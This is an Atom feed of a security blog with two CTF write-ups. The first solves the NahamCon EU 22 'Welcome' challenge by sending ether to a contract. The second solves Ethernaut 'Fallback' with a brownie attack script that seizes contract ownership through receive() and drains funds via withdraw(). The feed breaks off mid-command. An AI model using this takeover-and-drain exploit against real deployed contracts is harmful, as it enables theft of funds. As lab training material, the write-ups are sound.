<?xml version='1.0' encoding='utf-8'?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <id>https://urara-demo.netlify.app/</id>
  <title><![CDATA[Home]]></title>
  <subtitle><![CDATA[Personal Blog]]></subtitle>
  <icon>https://urara-demo.netlify.app/favicon.png</icon>
  <link href="https://urara-demo.netlify.app" />
  <link href="https://urara-demo.netlify.app/atom.xml" rel="self" type="application/atom+xml" />
  <updated>2023-01-23T19:49:16.541Z</updated>
  <author>
    <name><![CDATA[Saikat Karmakar]]></name>
  </author>
  <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
  <category term="web3" scheme="https://urara-demo.netlify.app/?tags=web3" />
  <category term="smart contracts" scheme="https://urara-demo.netlify.app/?tags=smart%20contracts" />
  <category term="brownie" scheme="https://urara-demo.netlify.app/?tags=brownie" />
  <category term="nahamcon EU ctf 22" scheme="https://urara-demo.netlify.app/?tags=nahamcon%20EU%20ctf%2022" />
  <category term="ethernaut" scheme="https://urara-demo.netlify.app/?tags=ethernaut" />
  <category term="yogosha" scheme="https://urara-demo.netlify.app/?tags=yogosha" />
  <category term="Front-Matter" scheme="https://urara-demo.netlify.app/?tags=Front-Matter" />
  <category term="gitlab" scheme="https://urara-demo.netlify.app/?tags=gitlab" />
  <category term="rce" scheme="https://urara-demo.netlify.app/?tags=rce" />
  <category term="sqli" scheme="https://urara-demo.netlify.app/?tags=sqli" />
  <category term="web" scheme="https://urara-demo.netlify.app/?tags=web" />
  <category term="htb" scheme="https://urara-demo.netlify.app/?tags=htb" />
  <category term="tryhackme" scheme="https://urara-demo.netlify.app/?tags=tryhackme" />
  <category term="file upload" scheme="https://urara-demo.netlify.app/?tags=file%20upload" />
  <entry>
    <title type="html"><![CDATA[Welcome Web3]]></title>
    <link href="https://urara-demo.netlify.app/Welcome Web3" />
    <id>https://urara-demo.netlify.app/Welcome Web3</id>
    <published>2022-12-19T00:00:00.000Z</published>
    <updated>2022-12-19T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<p><a href="https://github.com/Aviksaikat/WalkThroughs/tree/master/nahamcon_EU_22/web3/Welcome_DONE" rel="nofollow noopener noreferrer external" target="_blank">Challenge Code</a></p><ul><li>So we have the challenge file in the <a href="https://github.com/Aviksaikat/WalkThroughs/tree/master/nahamcon_EU_22/web3/Welcome_DONE" rel="nofollow noopener noreferrer external" target="_blank">eth_welcome.zip</a> file. As after extracting we have the following files</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>% tree</div><div class='line'>.</div><div class='line'>├── contracts</div><div class='line'>│   └── Welcome.sol</div><div class='line'>├── eth_welcome.zip</div><div class='line'>├── interfaces</div><div class='line'>└── scripts</div><div class='line'>    └── challenge.py</div><div class='line'></div><div class='line'>3 directories, 3 files</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>Authors used <a href="https://eth-brownie.readthedocs.io/en/stable/python-package.html" rel="nofollow noopener noreferrer external" target="_blank">brownie</a> framework setting up this CTF challenges. So we can use this dir structure directly for our testing. So we have the target contract <code>Welcome.sol</code> &amp; <code>challenge.py</code> to check what are the requirements to solve this CTF, because there is no flag for these challenges. Instead when we have to use the given RPC url to submit our solution. So let’s get started.</p></li><li><p>So let’s start by reading the <code>challenge.py</code> file.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>from brownie import *</div><div class='line'></div><div class='line'>def deploy(state, deployer, player):</div><div class='line'>    Welcome.deploy(&#123;'from': deployer[0]&#125;)</div><div class='line'></div><div class='line'>def solved():</div><div class='line'>    if Welcome[-1].balance() &gt; 0:</div><div class='line'>        return True, "Solved!"</div><div class='line'>    else:</div><div class='line'>        return False, "Need more coins!"</div><div class='line'></div><div class='line'>CONFIG = &#123;</div><div class='line'>    # "RPC": '',</div><div class='line'>    # "BLOCK_NUMBER": '',</div><div class='line'>    # 'FLAGS': '',</div><div class='line'>    'MNEMONIC': 'test test test test test test test test test test test junk',</div><div class='line'>    # 'RUNNABLES': [],</div><div class='line'>    'ALLOWED_RPC_METHODS': []</div><div class='line'>&#125;</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>So we have 2 functions; <code>deploy</code> &amp; <code>solved</code>. By the names you can understand what they do. So let’s skip the deploy one &amp; see the <code>solved()</code>.</p></li><li><p>It’s simple <code>if Welcome[-1].balance() &gt; 0:</code> checks wether the balance of the contract is more than 0 or not. The <code>-1</code> indicates take the latest deployed contract instance. And lastly we have a <code>CONFIG</code> dictionary which has the <code>mnemonic</code> i.e. our private key for the given wallet. We can use this address to solve the challenge.</p></li><li><p>So it’s simple send money to the contract &amp; make it’s balance more than <code>0</code> &amp; solve the challenge. Hmmm how can we do that. Let’s look at the contract now.</p></li><li><p><code>Welcome.sol</code></p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>pragma solidity ^0.8.10;</div><div class='line'></div><div class='line'>contract Welcome &#123;</div><div class='line'></div><div class='line'>    receive() external payable &#123;</div><div class='line'>        </div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>So the first line is the <code>pragma solidity</code> which defines the compiler version we should be using for this contract. Next, we have the <code>contract</code> keyword with the contract name <code>Welcome</code> &amp; inside this contract there is a odd function/method i.e. called <code>receive()</code> &amp; it has no body. Odd…hmmm… not quite. Actually it’s pretty common in solidity.</p></li><li><p>This <code>receive()</code> fu. is called a <code>Fallback function</code>. Wait. What are those!!??.</p></li><li><p>According to Learn Ethereum [Book] - O’Reilly, <code>A fallback function is an unnamed external function without any input or output parameters. EVM executes the fallback function on a contract if none of the other functions match the intended function calls</code>.</p></li><li><p>In terms of english, a fallback function is fn. which is used to receive tokens (ETH or anything) from other sources (other contract/wallet etc.). It has no body, it doesn’t take any input parameter and it doesn’t return anything. This method is the latest way of receiving money(tokens) from other sources. In older version of solidity this can be done by just specifying the <code>function</code> keyword like this <code>function() external payable {}</code>.</p></li><li><p>The <code>external</code> specifies that the fn. can be called from other contracts or wallets.</p></li><li><p>Lastly the <code>payable</code> keyword. It’s very important as without this keyword this contract can’t receive any payments. It tells the <code>EVM</code> that this function is capable of receiving eth.</p></li><li><p>Ok let’s make our attack script. We have started our instance. We can run this locally as well because by the time I publish this writeup the site will be pretty much taken down.</p></li></ul><p><img src="/assets/challenge_start.png" alt="/assets/challenge_start.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p><ul><li>To run the contract in the challenge environment from brownie fist we have to add it to the <code>brownie networks list</code>. To do this we have to use this command. To know more always read the docs.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>brownie networks add Ethereum 1337 host=&lt;RPC URL&gt; chainid=1</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>And we’ll get something like this.<img src="/assets/networks-add.png" alt="/assets/networks-add.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>Cool let’s start writing our script.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>from brownie import *</div><div class='line'></div><div class='line'>def solved(welcome_address):</div><div class='line'>    if Welcome.at(welcome_address).balance() &gt; 0:</div><div class='line'>        return "Solved!"</div><div class='line'>    else:</div><div class='line'>        return "Need more coins!"</div><div class='line'></div><div class='line'>def main(welcome_address=None):</div><div class='line'>    if welcome_address:</div><div class='line'>        # print("Yo")</div><div class='line'>        CONFIG = &#123;</div><div class='line'>            "RPC": "https://ctf.nahamcon.com/challenge/39/4b1c3f26-f849-4ead-b563-6ddc5f5d477b",</div><div class='line'>            # "BLOCK_NUMBER": '',</div><div class='line'>            # 'FLAGS': '',</div><div class='line'>            "MNEMONIC": "test test test test test test test test test test test junk",</div><div class='line'>            # 'RUNNABLES': [],</div><div class='line'>            "ALLOWED_RPC_METHODS": [],</div><div class='line'>        &#125;</div><div class='line'>        # welcome_address = "0x0cB8C2Fe5f94B3b9a569Df43a9155AC008c9884b"</div><div class='line'>        attacker = accounts.from_mnemonic(CONFIG["MNEMONIC"])</div><div class='line'>        tx = attacker.transfer(to=welcome_address, amount="0.01 ether")</div><div class='line'>        tx.wait(1)</div><div class='line'></div><div class='line'>        print(f"Solved: &#123;solved(welcome_address)&#125;")</div></code></div></pre><!-- HTML_TAG_END --><ul><li>So we have defined our <code>main</code> fn. There is if part because I’m going to pass the contract address as a command line argument to make it more generic you can just uncomment the <code>welcome_address</code> variable. The <code>else</code> part is to test the contract locally. We’ll get into in later. We have the <code>CONFIG</code> dictionary which has the <code>mnemonic</code> key.</li><li>Next loads the wallet from the mnemonic. <code>accounts.from_mnemonic(CONFIG[&quot;MNEMONIC&quot;])</code>.So we’re pulling the <code>mnemonic</code> from <code>CONFIG</code> dictionary &amp; saving it as the <code>attacker</code> variable.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>tx = attacker.transfer(to=welcome_address, amount="0.1 ether")</div><div class='line'>tx.wait(1)</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>Next we’re sending <code>0.1 ETH</code> from our wallet to the target contract &amp; the next line is not necessary but we’re waiting for the transaction.</p></li><li><p>Lastly we’re calling the <code>solved()</code> fn. to get check wether all these code makes any sense or not.</p></li><li><p>Now let’s do the magic. To run we have to use the following command.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>brownie run scripts/attack.py main &lt;address of the contract&gt; --network &lt;network name&gt;</div></code></div></pre><!-- HTML_TAG_END --><p><img src="/assets/run.png" alt="/assets/run.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p><ul><li><p>Done! We have solved the challenge!!!</p></li><li><p>Now the bonus part. If we want to test this locally we can do this with just a few tweaks. Let’s see how we can do that. So to do that fist we have to deploy the contract locally. So let’s add the <code>else</code>.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>def deploy_local():</div><div class='line'>    return Welcome.deploy(&#123;"from": accounts[0]&#125;)</div><div class='line'>    [...]</div><div class='line'>    else:</div><div class='line'>        welcome = deploy_local()</div><div class='line'>        welcome_address = welcome.address</div><div class='line'>        # print(address)</div><div class='line'></div><div class='line'>        # send ether forcefully</div><div class='line'>        attacker = accounts[1]</div><div class='line'>        tx = attacker.transfer(to=welcome_address, amount="0.001 ether")</div><div class='line'>        tx.wait(1)</div><div class='line'></div><div class='line'>        print(f"Solved: &#123;solved_locally()&#125;")</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>The <code>deploy_local</code> fn. is going to deploy the contract locally &amp; this is the syntax to do that. Notice the <code>{&quot;from&quot;: accounts[0]}</code> which is the defined way of deploying smart contracts in brownie. We’re specifying the account from which the contract is being deployed. <code>accounts</code> is a list provided by brownie that contains 10 test accounts indexed from 0-9. We can use any of them. Then we’re setting the address of the deployed contract to the <code>welcome_address</code> variable &amp; we’re using the 2nd test account as the attacker account. It can be anything other than the fist account otherwise it’s worthless if we’re the admin then everything is pointless. Apart from that everything is same. So the final script looks like this.</p></li><li><p><code>attack.py</code></p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>from brownie import *</div><div class='line'></div><div class='line'>def deploy(state, deployer, player):</div><div class='line'>    Welcome.deploy(&#123;"from": deployer[0]&#125;)</div><div class='line'></div><div class='line'></div><div class='line'>def solved(welcome_address):</div><div class='line'>    if Welcome.at(welcome_address).balance() &gt; 0:</div><div class='line'>        return "Solved!"</div><div class='line'>    else:</div><div class='line'>        return "Need more coins!"</div><div class='line'></div><div class='line'># ------------------------------------------------</div><div class='line'></div><div class='line'>def deploy_local():</div><div class='line'>    return Welcome.deploy(&#123;"from": accounts[0]&#125;)</div><div class='line'></div><div class='line'>def solved_locally():</div><div class='line'>    if Welcome[-1].balance() &gt; 0:</div><div class='line'>        return True, "Solved!"</div><div class='line'>    else:</div><div class='line'>        return False, "Need more coins!"</div><div class='line'></div><div class='line'></div><div class='line'>def main(welcome_address=None):</div><div class='line'>    if welcome_address:</div><div class='line'>        # print("Yo")</div><div class='line'>        CONFIG = &#123;</div><div class='line'>            "RPC": "https://ctf.nahamcon.com/challenge/39/4b1c3f26-f849-4ead-b563-6ddc5f5d477b",</div><div class='line'>            # "BLOCK_NUMBER": '',</div><div class='line'>            # 'FLAGS': '',</div><div class='line'>            "MNEMONIC": "test test test test test test test test test test test junk",</div><div class='line'>            # 'RUNNABLES': [],</div><div class='line'>            "ALLOWED_RPC_METHODS": [],</div><div class='line'>        &#125;</div><div class='line'>        # welcome_address = "0x0cB8C2Fe5f94B3b9a569Df43a9155AC008c9884b"</div><div class='line'>        attacker = accounts.from_mnemonic(CONFIG["MNEMONIC"])</div><div class='line'>        tx = attacker.transfer(to=welcome_address, amount="0.01 ether")</div><div class='line'>        tx.wait(1)</div><div class='line'></div><div class='line'>        print(f"&#123;solved(welcome_address)&#125;")</div><div class='line'></div><div class='line'>    else:</div><div class='line'>        welcome = deploy_local()</div><div class='line'>        welcome_address = welcome.address</div><div class='line'>        # print(address)</div><div class='line'></div><div class='line'>        # send ether forcefully</div><div class='line'>        attacker = accounts[1]</div><div class='line'>        tx = attacker.transfer(to=welcome_address, amount="0.001 ether")</div><div class='line'>        tx.wait(1)</div><div class='line'></div><div class='line'>        print(f"Solved: &#123;solved_locally()&#125;")</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><ul><li>We can run this as before but we don’t have to specify anything now.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>brownie run scripts/attack.py</div></code></div></pre><!-- HTML_TAG_END --><p><img src="/assets/solved.png" alt="/assets/solved.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p><ul><li>And it’s done. I hope you liked this writeup. Thanks for reading. See ya!!</li></ul>]]>
    </content>
    <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
    <category term="web3" scheme="https://urara-demo.netlify.app/?tags=web3" />
    <category term="smart contracts" scheme="https://urara-demo.netlify.app/?tags=smart%20contracts" />
    <category term="brownie" scheme="https://urara-demo.netlify.app/?tags=brownie" />
    <category term="nahamcon EU ctf 22" scheme="https://urara-demo.netlify.app/?tags=nahamcon%20EU%20ctf%2022" />
  </entry>
  <entry>
    <title type="html"><![CDATA[Ethernaut Fallback]]></title>
    <link href="https://urara-demo.netlify.app/Ethernaut/Fallback" />
    <id>https://urara-demo.netlify.app/Ethernaut/Fallback</id>
    <published>2022-08-17T00:00:00.000Z</published>
    <updated>2022-12-19T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<ul><li><p><code>Difficulty</code>: 1/10</p></li><li><p><code>Objective</code>:</p><ol><li>claim ownership of the contract</li><li>reduce its balance to <code>0</code></li></ol></li><li><p><code>Things that might help</code>:</p><ol><li>How to send ether when interacting with an ABI</li><li>How to send ether outside of the ABI</li><li>Converting to and from wei/ether units (see help() command)</li><li>Fallback methods</li></ol></li><li><p><code>Fallback.sol</code></p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>// SPDX-License-Identifier: MIT</div><div class='line'>pragma solidity ^0.6.0;</div><div class='line'></div><div class='line'>import "@openzeppelin/contracts/math/SafeMath.sol";</div><div class='line'></div><div class='line'>contract Fallback &#123;</div><div class='line'></div><div class='line'>  using SafeMath for uint256;</div><div class='line'>  mapping(address =&gt; uint) public contributions;</div><div class='line'>  address payable public owner;</div><div class='line'></div><div class='line'>  constructor() public &#123;</div><div class='line'>    owner = msg.sender;</div><div class='line'>    contributions[msg.sender] = 1000 * (1 ether);</div><div class='line'>  &#125;</div><div class='line'></div><div class='line'>  modifier onlyOwner &#123;</div><div class='line'>        require(</div><div class='line'>            msg.sender == owner,</div><div class='line'>            "caller is not the owner"</div><div class='line'>        );</div><div class='line'>        _;</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>  function contribute() public payable &#123;</div><div class='line'>    require(msg.value &lt; 0.001 ether);</div><div class='line'>    contributions[msg.sender] += msg.value;</div><div class='line'>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</div><div class='line'>      owner = msg.sender;</div><div class='line'>    &#125;</div><div class='line'>  &#125;</div><div class='line'></div><div class='line'>  function getContribution() public view returns (uint) &#123;</div><div class='line'>    return contributions[msg.sender];</div><div class='line'>  &#125;</div><div class='line'></div><div class='line'>  function withdraw() public onlyOwner &#123;</div><div class='line'>    owner.transfer(address(this).balance);</div><div class='line'>  &#125;</div><div class='line'>  </div><div class='line'>  // fallback fn. :)</div><div class='line'>  receive() external payable &#123;</div><div class='line'>    require(msg.value &gt; 0 && contributions[msg.sender] &gt; 0);</div><div class='line'>    owner = msg.sender;</div><div class='line'>  &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><h2 id="solution"><a href="#solution">Solution</a></h2><ul><li>First initialise an empty brownie project using the following command</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>brownie init</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>Save the <code>Fallback.sol</code> in the contracts folder.</p></li><li><p>Setup the environment in the <code>.env</code> file like this. <code>PRIVATE_KEY</code> = wallet private key</p></li><li><p><code>.env</code></p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>export PRIVATE_KEY=0xb8abda....231</div><div class='line'>export WEB3_INFURA_PROJECT_ID=c2abfm......haha</div></code></div></pre><!-- HTML_TAG_END --><ul><li>Now we have to setup <code>brownie-config.yaml</code> file to flatten the contract &amp; compile into ABI so that we can work with it (Only for testing locally)</li><li><code>brownie-config.yaml</code></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>dependencies:</div><div class='line'>  - OpenZeppelin/openzeppelin-contracts@3.0.0</div><div class='line'>compiler:</div><div class='line'>  solc:</div><div class='line'>    remappings:</div><div class='line'>      - "@openzeppelin=OpenZeppelin/openzeppelin-contracts@3.0.0"</div><div class='line'>dotenv: .env</div><div class='line'>networks:</div><div class='line'>  default: mainnet-fork</div><div class='line'>  rinkeby:</div><div class='line'>    verify: False</div><div class='line'>wallets:</div><div class='line'>  from_key: $&#123;PRIVATE_KEY&#125;</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>We have to tell the solidity compiler to look for the imports locally &amp; that’s what’s the <code>remapping</code> section is doing &amp; thed <code>dependencies</code> section is downloading the dependencies locally.</p></li><li><p><code>IFallback.sol</code> The interface. Which will make our work a lot easier. Save it inside the <code>interface</code> folder.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>// SPDX-License-Identifier: MIT</div><div class='line'>pragma solidity ^0.6.0;</div><div class='line'></div><div class='line'>interface Fallback &#123;</div><div class='line'>    function contribute() external payable;</div><div class='line'></div><div class='line'>    function getContribution() external;</div><div class='line'></div><div class='line'>    function withdraw() external;</div><div class='line'>&#125;</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><ul><li>Now let’s write some scripts. First one is <code>helpful_scripts</code>. This script helps us to get the testing accounts both for local testing &amp; actual network testing.</li><li><code>helpful_scripts</code></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>from brownie import network, accounts, config</div><div class='line'></div><div class='line'>FORKED_LOCAL_ENVIRONMENTS = ["mainnet-fork", "mainnet-fork-dev"]</div><div class='line'>LOCAL_BLOCKCHAIN_ENVIRONMENTS = [</div><div class='line'>    "development",</div><div class='line'>    "ganache-local",</div><div class='line'>    "ganache-local-new-chainId",</div><div class='line'>]</div><div class='line'></div><div class='line'></div><div class='line'>def get_account():</div><div class='line'>    if (</div><div class='line'>        network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS</div><div class='line'>        or network.show_active() in FORKED_LOCAL_ENVIRONMENTS</div><div class='line'>    ):</div><div class='line'>        return accounts[0], accounts[1]</div><div class='line'></div><div class='line'>    if network.show_active() in config["networks"]:</div><div class='line'>        return accounts.add(config["wallets"]["from_key"])</div><div class='line'></div><div class='line'>    return None</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p><code>network.show_active()</code> is a built-in brownie method to check the network we’re testing. For rikeby the later <code>if</code> statement will get executed &amp; our metamask wallet will be connected.</p></li><li><p><code>FORKED_LOCAL_ENVIRONMENTS</code> list contains the name of the local networks &amp; <code>FORKED_LOCAL_ENVIRONMENTS</code> is only needed if we run our own blockchain env using ganache or something else. We don’t need that. In short this section will get executed if you use the tag <code>--network mainnet-fork</code> with <code>brownie</code>. More on that in the latter section.</p></li><li><p>Ok we have out accounts. Let’s deploy the code to test locally so that we don’t waste any ether.</p></li><li><p><code>deploy.py</code></p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>from brownie import Fallback</div><div class='line'>from scripts.helpful_scripts import get_account</div><div class='line'></div><div class='line'></div><div class='line'>def deploy():</div><div class='line'>    owner, _ = get_account()</div><div class='line'></div><div class='line'>    fallback = Fallback.deploy(&#123;"from": owner&#125;)</div><div class='line'>    </div><div class='line'>    print(f"Contract Deployed to &#123;fallback.address&#125;")</div><div class='line'>    return fallback, owner</div><div class='line'></div><div class='line'></div><div class='line'>def main():</div><div class='line'>    deploy()</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>First we’re importing the Fallback contract from brownie i.e. the ABI (I guess so :)). Then the next import is our <code>get_account</code> function to get our testing accounts. This <code>deploy</code> function is deploying the contract locally &amp; returnining the contract object &amp; the address of the owner.</p></li><li><p>Now the final &amp; most important one.</p></li><li><p><code>attack.py</code></p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>from brownie import interface</div><div class='line'>from web3 import Web3</div><div class='line'>from colorama import Fore</div><div class='line'>from scripts.deploy import deploy</div><div class='line'>from scripts.helpful_scripts import get_account</div><div class='line'></div><div class='line'># ? Global variables</div><div class='line'>AMOUNT = 0.00002</div><div class='line'>CONVERTED_AMOUNT = Web3.toWei(AMOUNT, "ether")</div><div class='line'></div><div class='line'># * colours</div><div class='line'>green = Fore.GREEN</div><div class='line'>red = Fore.RED</div><div class='line'>blue = Fore.BLUE</div><div class='line'>magenta = Fore.MAGENTA</div><div class='line'>reset = Fore.RESET</div><div class='line'></div><div class='line'></div><div class='line'>def attack(contract_address=None, attacker=None):</div><div class='line'>    if contract_address is None:</div><div class='line'>        fallback_contract, owner = deploy()</div><div class='line'>        contract_address = fallback_contract.address</div><div class='line'>        # ? Geeting the accounst for local testing</div><div class='line'>        _, attacker = get_account()</div><div class='line'></div><div class='line'>    # print(contract_address)</div><div class='line'>    # print(attacker)</div><div class='line'>    # exit(1)</div><div class='line'></div><div class='line'>    fallback = interface.Fallback(contract_address)</div><div class='line'>    contrib_tx = fallback.contribute(&#123;"from": attacker, "value": CONVERTED_AMOUNT&#125;)</div><div class='line'>    contrib_tx.wait(1)</div><div class='line'></div><div class='line'>    print(f"&#123;green&#125;Contributed &#123;AMOUNT&#125; ETH to the contract&#123;reset&#125;")</div><div class='line'>    print(</div><div class='line'>        f"Contract Balance: &#123;green&#125;&#123;Web3.fromWei(fallback_contract.balance(), 'ether')&#125; ETH&#123;reset&#125;"</div><div class='line'>    )</div><div class='line'></div><div class='line'>    # ? Invoking the fallback fn. i.e. the recieve() methind in solidity which enables a contract to accept payments</div><div class='line'></div><div class='line'>    print(f"&#123;red&#125;Doing the Attack by invoking the fallback fn.&#123;reset&#125;")</div><div class='line'>    attack_tx = attacker.transfer(contract_address, CONVERTED_AMOUNT)</div><div class='line'>    attack_tx.wait(1)</div><div class='line'></div><div class='line'>    print(f"Previous Address of the owner : &#123;green&#125;&#123;owner&#125;&#123;reset&#125;")</div><div class='line'>    print(f"Current Address of the owner : &#123;green&#125;&#123;fallback_contract.owner()&#125;&#123;reset&#125;")</div><div class='line'>    print(f"Address of the attacker : &#123;green&#125;&#123;attacker&#125;&#123;reset&#125;")</div><div class='line'>    print(f"&#123;red&#125;Hehe Wer're now the owner&#123;reset&#125;")</div><div class='line'></div><div class='line'>    # ? Draining the funds</div><div class='line'>    print(f"&#123;magenta&#125;Now Draining the funds!!!&#123;reset&#125;")</div><div class='line'></div><div class='line'>    drain_tx = fallback_contract.withdraw(&#123;"from": attacker&#125;)</div><div class='line'>    drain_tx.wait(1)</div><div class='line'></div><div class='line'>    print(f"Contract Balance: &#123;green&#125;&#123;fallback_contract.balance()&#125;&#123;reset&#125;")</div><div class='line'>    print(f"&#123;red&#125;All the money has been withdrawn!!&#123;reset&#125;")</div><div class='line'></div><div class='line'></div><div class='line'>def main(contract_address=None):</div><div class='line'>    if contract_address:</div><div class='line'>        attack(contract_address, get_account())</div><div class='line'>    else:</div><div class='line'>        attack()</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>The imports are pretty basic. I hope you will undertand them. <code>colorama</code> is to make the outpur colourful. It’s pretty hard to read the output if it’s plain text.</p></li><li><p>Next we have some global variables pretty much basic stuff &amp; the names speaks for itself.</p></li><li><p>Let’s start with the <code>main()</code> function. It takes 1 parameter &amp; it’s default value is set to <code>None</code> i.e. if we don’t pass any values then it’ll be set to <code>None</code>.</p></li><li><p>If it’s not <code>None</code> then we’re calling the <code>attack</code> fn. with 2 parameters <code>contract_address</code> &amp; with our account (the metamask wallte one). This one will get executed when we test the script on actual testnet for this case on <code>rinkeby</code>.</p></li><li><p>Else we’re just calling the <code>attack</code> fn. &amp; it’ll not be a problem because see the fn. declaraion <code>def attack(contract_address=None, attacker=None)</code>, the default values are <code>None</code>.</p></li><li><p>Moving on, <code>if contract_address is None:</code> will get executed when we’re testing locally. This one is just setting up the contract address &amp; accounts which we deployed locally.</p></li><li><p>We’re making a contract object by using the interface we created easier &amp; passing the address of our contract to it</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>fallback = interface.Fallback(contract_address)</div></code></div></pre><!-- HTML_TAG_END --><h2 id="approach"><a href="#approach">Approach</a></h2><ol><li><p>We have to claim the contract i.e. we have to be the owner. For this we have to have contribute more than the owner. Which is a porblem for 2 reasons.</p><ol><li>We don’t have that much ether</li><li>We can’t send more than <code>0.001</code> because of this line <code>require(msg.value &lt; 0.001 ether)</code> in <code>contribute</code> fn.</li></ol></li><li><p>What can we do here… Interestingly there is a <code>receive()</code> method which is interesting. This one says that if we make any contribution which is greater than <code>0</code> then we’ll be the owner of the contract. But this doesn’t look like a normal fn. It doesn’t have the <code>function</code> keyword. If we look at solidity documentation the <code>receive()</code> method is a special method (from solidity 6) that allows a contract to receive payments i.e. ether. Ok coool. More on <a href="https://www.educative.io/answers/how-to-receive-ethers-inside-a-smart-contract" rel="nofollow noopener noreferrer external" target="_blank">receive</a> fn.</p></li></ol><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>receive() external payable &#123;</div><div class='line'>        require(msg.value &gt; 0 && contributions[msg.sender] &gt; 0);</div><div class='line'>        owner = msg.sender;</div><div class='line'>    &#125;</div></code></div></pre><!-- HTML_TAG_END --><ul><li>Let’s attack it now. First we’re sending some ether to this contract.  </li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>contrib_tx = fallback.contribute(&#123;"from": attacker, "value": CONVERTED_AMOUNT&#125;)</div><div class='line'>contrib_tx.wait(1)</div></code></div></pre><!-- HTML_TAG_END --><ul><li>Now we’re using the <code>transfer</code> functionality of brownie to send the money to the contract.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>attack_tx = attacker.transfer(contract_address, CONVERTED_AMOUNT)</div><div class='line'>attack_tx.wait(1)</div></code></div></pre><!-- HTML_TAG_END --><ul><li>By invoking this function we’re matching the require statement in the <code>require()</code> method of the contract &amp; this will make us the new owner.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'>require(msg.value &gt; 0 && contributions[msg.sender] &gt; 0);</div><div class='line'>owner = msg.sender;</div></code></div></pre><!-- HTML_TAG_END --><ul><li>Now to complete the challenge we have to drain all the funds. It’s easy now as we’re now the owner we cann call the built-in <code>withdraw()</code> function.</li></ul><h2 id="using-brownie-to-run-the-program"><a href="#using-brownie-to-run-the-program">Using Brownie to run the program</a></h2><ul><li>To run on local development environment. This will compile all the nesessary files &amp; run the attack script.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>brownie run .scriptsattack.py</div></code></div></pre><!-- HTML_TAG_END --><p><img src="/assets/fallback.png" alt="/assets/fallback.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p><ul><li>To run on <code>rikeby</code> network use this command. Syntax is <code>brownie run &lt;script.py&gt; 